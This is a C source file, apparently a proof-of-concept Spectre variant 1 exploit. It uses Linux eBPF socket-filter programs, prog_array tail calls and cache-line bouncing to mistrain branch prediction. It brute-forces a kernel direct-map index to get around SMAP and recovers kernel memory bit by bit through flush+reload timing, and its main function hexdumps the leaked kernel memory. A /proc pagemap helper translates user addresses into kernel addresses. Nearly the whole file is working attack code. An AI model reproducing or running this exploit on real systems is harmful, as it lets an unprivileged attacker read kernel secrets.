#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h> // cpu_set_t
#include <sys/mman.h> // mmap
#include <stdlib.h> // calloc
#include <string.h> // memset
#include <pthread.h>
#include <ctype.h> // isalnum
#include "bpfheader.h"

#define ALLOC_SIZE 		1024*1024*512 // 512 MB
#define PRESENT_MASK	1ULL<<63
#define PFN_MASK			((1ULL << 55) - 1) 
#define PAGE_OFFSET    0xFFFF880000000000UL

char user_leak_area_smap[4096] __attribute__((aligned(4096))) = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0xa0,};


struct mem_leaker_prog {
  int victim_map;
  int data_map;
  int prog_map;

  int sockfd;

  unsigned long kernel_leak_area_index;
};

void user_flush_cacheline(void *arg) {
  asm volatile(
    "mov $0, %%eax\n\t"
    "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
    "clflush %0"
  : "+m" (*(volatile char *)arg)
  : /* no inputs */
  : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg) {
  int tsc1, tsc2, read_copy;
  asm volatile(
    "mov $0, %%eax\n\t"
    "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %0\n\t"
    "mov (%3), %%eax\n\t"
    "mov %%eax, %2\n\t"
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %1\n\t"
  : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
  : "r"((unsigned int *)arg)
  : "ax", "bx", "cx", "dx");
  return tsc2 - tsc1;
}


// 1 means "bounce it", -1 means "exit now"
volatile int cacheline_bounce_status;
int cacheline_bounce_fds[2];
void *cacheline_bounce_worker(void *arg) {
  // pin to core 3
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(3, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    err(1, "sched_setaffinity");

  while (1) {
    __sync_synchronize();
    int cacheline_bounce_status_copy;
    while ((cacheline_bounce_status_copy = cacheline_bounce_status) == 0) /* loop */;
    if (cacheline_bounce_status_copy == -1)
      return NULL;
    __sync_synchronize();

    struct bpf_insn insns[] = {
      BPF_LD_MAP_FD(BPF_REG_0, cacheline_bounce_fds[0]),
      BPF_LD_MAP_FD(BPF_REG_0, cacheline_bounce_fds[1]),
      BPF_LD_MAP_FD(BPF_REG_0, 0xffffff)
    };
    union bpf_attr attr = {
      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
      .insn_cnt = ARRSIZE(insns),
      .insns = (__aligned_u64) insns,
      .license = (__aligned_u64)GPLv2
    };
    if (bpf_(BPF_PROG_LOAD, &attr) != -1 || errno != EBADF)
      errx(1, "unexpected BPF_PROG_LOAD return on cacheline bounce");

    __sync_synchronize();
    cacheline_bounce_status = 0;
    __sync_synchronize();
  }
}
void bounce_cacheline(int fd) {
  cacheline_bounce_fds[0] = fd;
  cacheline_bounce_fds[1] = fd;
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}
pthread_t cacheline_bounce_thread;
void cacheline_bounce_worker_enable(void) {
  cacheline_bounce_status = 0;
  if (pthread_create(&cacheline_bounce_thread, NULL, cacheline_bounce_worker, NULL))
    errx(1, "pthread_create");
}
void cacheline_bounce_worker_disable(void) {
  cacheline_bounce_status = -1;
  if (pthread_join(cacheline_bounce_thread, NULL))
    errx(1, "pthread_join");
}



static int create_finder_insn(int data_map, int prog_map)
{
	struct bpf_insn finder_insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r3 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0),

    BPF_LD_MAP_FD(BPF_REG_ARG2, prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  exit_fixup(finder_insns, ARRSIZE(finder_insns));

  printf("before prog_map address finder\n");
  int sockfd = create_filtered_socket_fd(finder_insns, ARRSIZE(finder_insns));
  printf("after prog_map address finder\n");

  cacheline_bounce_worker_enable();
  return sockfd;
}

/* get_leak_index_from_bruteforce() */
static unsigned long get_leak_index_from_bruteforce(int prog_map)
{
	unsigned long base_area = 0xffff880000000000UL;	/* depends on kernel version, It's for 4.4-generic-62 */
	unsigned long cand_start[2] = { 0xffff880300000000UL, 0xffff880000000000UL};
	unsigned long cand_end[2] = {   0xffff8803fffff000UL, 0xffff8800fffff000UL};
	unsigned long cand;
	unsigned long leak_offset = 0x00UL;
	unsigned long leak_index[2];
	unsigned long progress = 0;
	int i, j;
	int mislead_i;
	int sockfd;

	if (mlock(user_leak_area_smap, sizeof(user_leak_area_smap)) != 0) {
		printf("mlock error\n");
		exit(0);
	}
	printf("mlock success\n");

	int data_map = array_create(8, 2);
	sockfd = create_finder_insn(data_map, prog_map);

	for (i=0; i<2; i++) {
		for (cand=cand_start[i]; cand<cand_end[i]; cand+=4096) {
			leak_offset = cand - base_area;
			leak_index[0] = ((leak_offset + BPF_ARRAY_VALUE_OFFSET) / 8) - 0x18;

			leak_offset = base_area - cand;
			leak_index[1] = ((leak_offset + BPF_ARRAY_VALUE_OFFSET) / 8) - 0x18;

			for (j=0; j<2; j++) {
				for (mislead_i = 0; mislead_i < 33; mislead_i++) {
					if ((mislead_i&7) != 7) {
					  array_set_dw(data_map, 1, 0); // execute instaquit program ;  execute quite program with normal offset.  mistraining conditional branch!!
					} else {  // execute wrong index.
					  array_set_dw(data_map, 1, leak_index[j]);

					  // flush probing memory in user space
					  user_flush_cacheline(user_leak_area_smap);

						// bounce cacheline of prog_map in kernel space
						// we can't flush prog_map as like prime_mappings, so alternative approach is bouncing cache line.
					  bounce_cacheline(prog_map);
					}

					trigger_proc(sockfd);  // run eBPF program!! 
					if ((mislead_i&7) == 7) {  // If speculative execution triggered,
						int reload_time = user_timed_reload(user_leak_area_smap);
						if (reload_time < 100) {
							printf("hit!! leak_index[%d] : %lx\n", j, leak_index[j]);
							return leak_index[j];
						}
					}
				}
			}
			progress++;
			if ((progress % (1<<15)) == 0) {
				printf("progress : [%d][%lx]\n", i, cand);
			}
		}
	}

	return 0;
}

void bounce_two_cachelines(int fd1, int fd2) {
  cacheline_bounce_fds[0] = fd1;
  cacheline_bounce_fds[1] = fd2;
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}


struct mem_leaker_prog load_mem_leaker_prog() {
  struct mem_leaker_prog ret;

  union bpf_attr create_prog_map_attrs = {
    .map_type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = 4,
    .value_size = 4,
    .max_entries = 2048/8 + 1 /* kmalloc-4096 slab for fixed in-page alignment */
  };
  
  ret.prog_map = bpf_(BPF_MAP_CREATE, &create_prog_map_attrs);

  if(ret.prog_map == -1)
    err(1, "error - prog_map create");
  
  struct bpf_insn quitter_insns[] = {
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  int quitter_prog = prog_load(quitter_insns, ARRSIZE(quitter_insns));
  array_set(ret.prog_map, 0, quitter_prog);

  ret.kernel_leak_area_index = get_leak_index_from_bruteforce(ret.prog_map);
	if(ret.kernel_leak_area_index ==0)
		err(1, "kernel leak fail");

  ret.victim_map = array_create(8, 5/*whatever*/);

  // control runtime behavior with this.
  // slot 0: index of secret value
  // slot 1: start offset in prog_map
  // slot 2: bitmask (1/2/4/8/...)
  // slot 3: bitshift selector (0/1/2/3/...)
  ret.data_map = array_create(8, 4);

  struct bpf_insn insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r7 = bitmask
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 2),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

    // r9 = bitshift selector
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 3),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),

    // r8 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

    // r0 = secret_data_offset = *map_lookup_elem(data_map, &0)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

    // r2 = &secret_data_offset
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_STX_MEM(BPF_W, BPF_REG_ARG2, BPF_REG_0, 0),

    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.victim_map),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), /* speculative execution starts in here */
    BPF_GOTO_EXIT_IF_R0_NULL, /* predicted: non-NULL, actual: NULL */
    BPF_LDX_MEM(BPF_DW, BPF_REG_ARG3, BPF_REG_0, 0),
	//BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),  /* leak test - fp */

    /*
     * mask and shift secret value so that it maps to one of two cachelines.
     */
    BPF_ALU64_REG(BPF_AND, BPF_REG_ARG3, BPF_REG_7),
    BPF_ALU64_REG(BPF_RSH, BPF_REG_ARG3, BPF_REG_9),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_ARG3, 7),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_ARG3, BPF_REG_8),

    BPF_LD_MAP_FD(BPF_REG_ARG2, ret.prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  int exit_idx = ARRSIZE(insns) - 1;
  for (int i=0; i<ARRSIZE(insns); i++) {
    if (insns[i].code == (BPF_JMP | BPF_OP(BPF_JEQ) | BPF_K) && insns[i].off == 0x7ff) {
      printf("fixing up exit jump\n");
      insns[i].off = exit_idx - i - 1;
    }
  }

  printf("before leak program load\n");
  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  printf("after leak program load\n");

  return ret;
}

void querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum){
	char path[30];
	uint64_t* pentry = NULL;
	FILE* fp = NULL;

	if((pentry = calloc(pnum, sizeof(uint64_t)))==NULL)
		err(1,"calloc fail");
	memset(path, 0, 30);

	if(snprintf(path, 30, "/proc/%d/pagemap", pid)> 30) // overflow
		err(1, "snprintf overflow");
	
	if((fp=fopen(path,"r"))==NULL)
		err(1, "opening %s fail", path);
	
	if((fseek(fp, (vaddr/psize)*sizeof(uint64_t), SEEK_CUR))==-1)
		err(1, "pagemap seek fail");
	if(fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)
		err(1, "pagemap read fail");
	
	unsigned long kaddr = 0;
	vaddr += (pnum-1)*psize;
	while(pnum>0){
		if(pentry[pnum-1] & PRESENT_MASK == 0){
			printf("[*] Page Number %zd\n", pnum - 1);
			printf("[*] present bit 0\n");
			
			pnum--;
			kaddr = 0;
			vaddr -= psize;

			continue;
		}
		kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize) + PAGE_OFFSET + (vaddr & (psize - 1));
		printf("[*] Page Number %zd\n", pnum - 1);
    printf("[*] present bit 1\n");
    printf("[*] PFN is %llu\n\n", pentry[pnum - 1] & PFN_MASK);
		printf("[*] %#lx is kernel-mapped at %#lx\n\n",vaddr,kaddr);


		pnum--;
		kaddr = 0;
		vaddr -= psize;
	}

	fclose(fp);
	return;
}

void test(){
	printf("[*] This option needs sudo previlge.\n");
	long psize;
	if((psize=sysconf(_SC_PAGE_SIZE))==-1)
		err(1, "reading page_size\n");
	printf("[*] Page size: %ld\n", psize);
	char* user_area = mmap(NULL,ALLOC_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	if(user_area == MAP_FAILED)
		err(1, "mmap alloc_size\n");	

	querypmap(getpid(), (unsigned long) user_area, psize, ALLOC_SIZE/psize);
}


int leak_bit(struct mem_leaker_prog *leakprog, unsigned long dw_offset,
        unsigned long in_dw_bit_offset,
		unsigned long kernel_leak_area_index, char *user_leak_area) {
  array_set_dw(leakprog->data_map, 2, 1UL<<in_dw_bit_offset); // 2 - bitmask
  array_set_dw(leakprog->data_map, 3, in_dw_bit_offset);  // 3 - bitshift

  char *user_leak_ptr1 = user_leak_area;
  char *user_leak_ptr2 = user_leak_area + 1024; /* 64 * 8 = 1024,  8 cache lines,  Leak a bit!! */

  for (int i=0; i<0x201; i++) {
    if ((i & 0xf) != 0xf) {
      array_set_dw(leakprog->data_map, 0, 3); // access at 8*3,  0 - index of secret value
      array_set_dw(leakprog->data_map, 1, 0); // execute instaquit program, 1 - start offset in prog_map
    } else {
      array_set_dw(leakprog->data_map, 0, dw_offset); // access at 8*dw_offset
	  array_set_dw(leakprog->data_map, 1, kernel_leak_area_index); // leak to kernel-direct-mmaped space, to bypass SMAP */

      bounce_two_cachelines(leakprog->victim_map, leakprog->prog_map);
      user_flush_cacheline(user_leak_ptr1);
      user_flush_cacheline(user_leak_ptr2);
    }

    trigger_proc(leakprog->sockfd);

    if ((i & 0xf) != 0xf) {

    } else {
      int times[2];
      times[0] = user_timed_reload(user_leak_ptr1);
      times[1] = user_timed_reload(user_leak_ptr2);
      bool bit_is_0 = (times[0] < 120);
      bool bit_is_1 = (times[1] < 120);
      if (bit_is_0 != bit_is_1) {
        return bit_is_1;
      } else {
        
      }
    }
  }

  return -1;
}


int leak_byte(struct mem_leaker_prog *leakprog, unsigned long byte_offset,
		unsigned long kernel_leak_area_index,  char *user_leak_area) {
  int byte = 0;
  int bit_pos_for_byte = (byte_offset&0x7)*8;
  for (int pos = 0; pos < 8; pos++) {
    int bit = leak_bit(leakprog, byte_offset/8, bit_pos_for_byte + pos,
            kernel_leak_area_index, user_leak_area);
    if (bit == -1) {
      return -1;
    }
    if (bit == 1) {
      byte |= (1<<pos);
    }
  }
  return byte;
}


void hexdump_memory(struct mem_leaker_prog *leakprog,
	unsigned long kernel_leak_area_index,  char *user_leak_area,
	unsigned long byte_offset_start, unsigned long byte_count) {
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    int bytes[16];
    for (int i=0; i<16; i++) {
      bytes[i] = leak_byte(leakprog, byte_offset + i, kernel_leak_area_index, user_leak_area);
    }
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        linep += sprintf(linep, "?? ");
      } else {
        linep += sprintf(linep, "%02hhx ", (unsigned char)bytes[i]);
      }
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        *(linep++) = '?';
      } else {
        if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
          *(linep++) = bytes[i];
        } else {
          *(linep++) = '.';
        }
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }

}

int main(int argc, char* argv[]){
  setbuf(stdout, NULL);
	// test();
	
  // pin to core 0
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    err(1, "sched_setaffinity");

  struct mem_leaker_prog leakprog = load_mem_leaker_prog();
  unsigned long kernel_leak_area_index = leakprog.kernel_leak_area_index;

	cacheline_bounce_worker_enable();
	hexdump_memory(&leakprog, kernel_leak_area_index, user_leak_area_smap, 0x1000, 0x100000000);
  return 0;

}